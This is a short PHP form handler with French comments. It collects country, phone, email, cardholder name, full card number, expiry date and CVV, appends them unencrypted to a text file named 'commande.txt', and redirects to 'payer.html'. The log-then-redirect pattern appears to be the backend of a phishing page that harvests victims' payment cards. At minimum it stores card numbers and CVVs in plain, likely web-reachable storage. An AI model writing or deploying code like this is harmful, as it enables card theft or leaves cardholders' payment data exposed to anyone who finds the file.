<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sécurisation des entrées
    $pays = htmlspecialchars($_POST['pays']);
    $telephone = htmlspecialchars($_POST['telephone']);
    $email = htmlspecialchars($_POST['email']);
    $cardHolder = htmlspecialchars($_POST['card-holder']);
    $cardNumber = htmlspecialchars($_POST['card-number']);
    $expiration = htmlspecialchars($_POST['expiration']);
    $cvv = htmlspecialchars($_POST['cvv']);

    // Création de la chaîne de données
    $data = "Pays: $pays\n";
    $data .= "Téléphone: $telephone\n";
    $data .= "Email: $email\n";
    $data .= "Nom sur la carte: $cardHolder\n";
    $data .= "Numéro de carte: $cardNumber\n";
    $data .= "Expiration: $expiration\n";
    $data .= "CVV: $cvv\n";
    $data .= "------------------------\n";

    // Chemin du fichier
    $file = 'commande.txt';

    // Enregistrer dans le fichier
    $handle = fopen($file, 'a');
    if ($handle) {
        fwrite($handle, $data);
        fclose($handle);
        
        // Redirection vers payer.html après l'enregistrement
        header('Location: payer.html');
        exit();
    } else {
        echo "Impossible d'ouvrir le fichier pour écrire.";
    }
}
?>
